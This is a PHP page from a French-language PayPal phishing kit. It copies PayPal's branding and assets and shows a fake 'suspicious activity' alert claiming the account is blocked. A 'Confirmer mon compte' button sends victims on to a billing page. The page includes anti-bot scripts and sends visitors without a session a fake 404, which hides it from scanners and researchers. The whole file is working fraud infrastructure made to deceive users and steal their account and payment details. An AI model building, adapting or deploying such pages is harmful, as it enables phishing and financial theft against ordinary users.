
<?php
ob_start();
session_start();
include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../monsterab/ab.php';
if(isset($_SESSION['login'])){

?>

<html>

<head>

	<title>Activité suspecte</title><meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta name="application-name" content="PayPal"><meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><meta name="keywords" content="transfer money, email money transfer, international money transfer "><meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address."><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png"><script data-test="ieScript" nonce="mUbN17cmA+fYmVuj8ga4x1Cyvv3SUQ2S8YLsYxACRTy3ZzUP">var isLessthanIE10 = false; window.onload = function() { if (isLessthanIE10) { document.getElementById('js_foreground').className += ' vx_hasNavAlert'; } }</script><script nonce="mUbN17cmA+fYmVuj8ga4x1Cyvv3SUQ2S8YLsYxACRTy3ZzUP">var helpCenterSpark = function () {}; var mountElement; var mountData = function(retry) { mountElement = document.getElementById('hc-contextual-help-app'); if (typeof mountElement !== 'undefined' && mountElement) { mountElement.dataset.locale = 'fr_FR'; mountElement.dataset.country = 'FR'; } else if (retry >= 0) { return setTimeout(function() { mountData(retry - 1); }, 200); } }; mountData(10); document.addEventListener('DOMContentLoaded', function () { var helpLinks = document.querySelectorAll('.js_contextualHelp'); for (var i = 0; i < helpLinks.length; i++) { helpLinks[i].addEventListener('click', function(event) { if (helpCenterSpark) { event.preventDefault(); helpCenterSpark('show'); } }); } })</script><script async="" defer="" src="https://www.paypalobjects.com/helpcenter/helpcenter-widget.min.js"></script><script async="" defer="" src="https://www.paypalobjects.com/messaging/messaging-loader.js"></script><script defer="" src="https://www.paypalobjects.com/ui-web/e79/c5920b3/e79/c5920b3/ui-web/notifications/1.38.0/notifications.min.js"></script> <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/ui-web/ui-web/header-footer/1.40.0/header-footer.min.css"/><style nonce="mUbN17cmA+fYmVuj8ga4x1Cyvv3SUQ2S8YLsYxACRTy3ZzUP">@media print and (max-width: 768px) { .vx_globalNav-container { display: none; } }</style><link rel="stylesheet" href="https&#x3A;&#x2F;&#x2F;www&#x2E;paypalobjects&#x2E;com&#x2F;web&#x2F;res&#x2F;8e3&#x2F;d82ddff5440cabffa0e5ff6e4bc94&#x2F;css/app.css">

</head>




<div style="background-color: #F7F7F7;"class="vx_modal-glimpse vx-modal-component-modal-outer submission-info-modal-outer vx_modalPrepToOpen vx_modalIsOpen" role="dialog" aria-describedby="submissionInfoModal-header" id="submissionInfoModal" aria-label="Modal Dialog">

	<div class="vx_modal-wrapper vx-modal-component-modal-wrapper submission-info-modal-wrapper"><div class="logo vx-modal-component-modal-logo submission-info-modal-logo">
		

	</div>
	<div class="vx_modal-content vx-modal-component-content submission-info-content">  


	<p class="vx_text-1 vx-modal-component_HeadText-1 submission-info-vx_text-1">Activité suspecte.</p>
<br>
	<center><span style="font-size: 15px;">Nous avons détecté une activité suspecte à partir de votre compte.</span> 
		<br>

		<span style="font-size: 15px;"> Une adresse IP différente aurait été repérée par notre service antifraude.
<br>
		 L'accès à votre compte est temporairement bloqué jusqu'à la confirmation de vos informations. </span></center>
	<div class="done-btn"><a href="../billing"><button href="../processing/bridge_unusual.php" class="btn btn-primary continue vx_btn vx_btn-block vx-modal-component-btn-style submission-info-vx_btn-block vx-modal-component_btn-block submission-info-close-action">Confirmer mon compte </button></a></div></div><div class="page"><div class="contents"><div class="loading"></div></div></div></div></div>
</html>






<?php
            }

            else{

             header("HTTP/1.0 404 Not Found");
  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }




        ?>